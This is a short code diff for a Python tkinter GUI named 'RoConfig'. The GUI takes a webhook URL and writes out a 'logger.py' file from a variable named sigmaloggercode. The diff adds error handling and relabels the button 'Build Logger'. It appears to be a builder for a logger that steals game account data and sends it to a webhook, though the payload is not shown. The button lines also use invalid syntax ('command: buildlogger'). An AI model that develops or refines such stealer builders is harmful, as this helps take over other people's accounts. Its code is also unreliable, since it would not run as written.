@@ -35,8 +35,11 @@ def encodeUrl():
         urlencode = False
 
 def buildlogger():
-    with open("logger.py", "w") as file:
-        file.write(sigmaloggercode)
+    try:
+        with open("logger.py", "w") as file:
+            file.write(sigmaloggercode)
+    except Exception as e:
+        errorlabel.config(text=e)        
     
 root = tk.Tk()
 root.title("RoConfig")
@@ -57,7 +60,9 @@ webhooklabel = tk.Label(root, text="Webhook Url:")
 webhooklabel.pack(pady=10)
 webhookinput = tk.Entry(root)
 webhookinput.pack(pady=15)
-webhooksubmit = tk.Button(root, text="Build", command: buildlogger)
+webhooksubmit = tk.Button(root, text="Build Logger", command: buildlogger)
+errorlabel = tk.Label(root, text="")
+errorlabel.pack()
 
 root.geometry("300x350")
 root.mainloop()
